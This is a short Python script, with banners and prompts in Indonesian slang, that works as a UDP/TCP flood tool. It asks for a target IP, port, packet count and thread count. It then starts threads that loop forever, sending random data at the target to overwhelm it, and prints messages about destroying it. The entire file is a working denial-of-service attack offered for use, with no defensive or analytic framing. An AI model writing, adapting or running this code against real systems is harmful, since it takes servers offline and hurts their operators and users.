#NathanChanzzz..
import random
import socket
import threading

print       (" =============== PAKET COD BY NATHAN =============== ")
print       (" - - > TOOLS BY NATHAN < - - ")
print       (" - - > JANGAN PAKE ABUSE YA ADIK ADIK < - - ")
print       (" ============== CREDITS ============== ")                                   
print       (" - - > DAH GAUSAH BANYAK BACOT < - - ")
print       (" - - > GAS KEUNNN KIRIM PAKET < - - ")
print       (" ========================================== ")
print       (" ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ ")

ip = str(input(" IP SERVER KESAYANGAN KALIAN:"))
port = int(input(" PORT NYA LUR:"))
times = int(input(" BERAPA KIRIM PAKETNYA MAS:"))
threads = int(input(" MAU BERAPA BARANGNYA:"))
choice = str(input(" KIRIM PAKETNYA GAK NIH ? (y or n):"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" OTW LURRR !! ")
		except:
			print("[!] ANCURINNNN !!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" OTW LURRR !! ")
		except:
			s.close()
			print("[*] ANCURINNNN !!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start() 
